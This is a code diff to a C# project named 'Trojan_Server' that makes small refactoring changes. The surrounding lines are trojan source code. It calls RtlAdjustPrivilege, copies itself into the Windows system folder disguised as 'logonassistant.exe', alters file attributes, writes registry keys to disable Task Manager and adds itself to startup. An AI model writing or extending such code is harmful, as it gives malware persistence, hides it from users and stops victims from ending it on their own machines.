@@ -11,6 +11,7 @@ namespace Trojan_Server
 {
     class Program
     {
+    	
         [DllImport("ntdll.dll", SetLastError = true)]
         public static extern IntPtr RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege,
                 bool IsThreadPrivilege, out bool PreviousValue);
@@ -162,7 +163,7 @@ namespace Trojan_Server
             try
             {
             	Log("Trying to Copy File to C:/Windows/SystemWOW64/logonassistant.exe", "DEBUG");
-                File.Copy(Convert.ToString(System.Reflection.Assembly.GetExecutingAssembly().Location), Convert.ToString(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe"), true);
+                File.Copy(Convert.ToString(System.Reflection.Assembly.GetExecutingAssembly().Location), Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", true);
                 Log("Found System Folder: C:/Windows/SystemWOW64", "DEBUG");
                 Log("File Copied to System Directory: C:/Windows/SystemWOW64/logonassistant.exe", "DEBUG");
                 Log("Trying change File Attributes", "DEBUG");
@@ -182,7 +183,7 @@ namespace Trojan_Server
                 objRegistryKey.Close();
                 Log("TaskManager disabled!", "DEBUG");
             }
-            catch
+            catch(Exception e)
             {
             	Log("Error while Adding to Startup!", "ERROR");
             }
